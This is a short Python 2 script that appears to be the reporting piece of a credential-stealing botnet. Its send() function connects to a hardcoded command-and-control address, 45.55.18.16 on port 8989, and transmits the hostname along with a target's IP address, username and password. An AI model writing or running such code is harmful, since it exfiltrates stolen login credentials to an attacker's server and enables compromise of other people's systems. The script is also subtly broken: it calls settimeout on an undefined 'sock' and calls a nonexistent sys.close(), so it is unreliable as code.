import socket, sys

C2 = "45.55.18.16"
C2PORT = 8989

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
sock.settimeout(10) 

def send(ip, usr, pw):
    try:
        try:
            s.connect((C2, C2PORT))
            s.send(socket.gethostname() + " ---> " + ip + " " + usr + " " + pw)
            print "sent"
        except socket.error, ex:
            print ex
    except KeyboardInterrupt:
        s.close()
        sys.close()
